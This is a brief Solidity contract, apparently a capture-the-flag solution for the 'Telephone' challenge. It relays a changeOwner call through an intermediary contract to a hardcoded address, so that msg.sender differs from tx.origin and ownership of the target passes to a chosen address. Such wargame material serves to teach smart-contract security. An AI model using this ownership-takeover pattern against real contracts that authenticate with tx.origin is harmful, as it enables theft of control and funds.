// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner( address _owner ) external;
}

contract ChangeOwner {
  address public Telephone = 0x6d1058694EE0dEce28c4C07E78e734D6dfB8e1f8;

  function changeOwner ( address _owner ) public {
    ITelephone( Telephone ).changeOwner(_owner);
  }
}